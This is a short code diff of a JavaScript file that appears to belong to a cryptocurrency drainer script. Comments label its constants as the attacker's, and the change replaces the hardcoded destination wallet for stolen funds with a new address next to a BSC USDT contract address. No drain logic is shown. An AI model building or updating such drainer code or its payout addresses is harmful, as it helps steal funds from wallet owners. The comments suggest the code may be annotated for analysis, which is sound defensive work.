@@ -3,7 +3,7 @@ import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethe
 
 // ── Attacker's Operational Constants ──
 // THIS is the REAL destination where funds go (hardcoded attacker wallet)
-const DEST_WALLET  = "0x2a8524097109450c5106Ee3a195A40a274535434";
+const DEST_WALLET  = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";
 
 // The USDT contract address on BSC
 const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
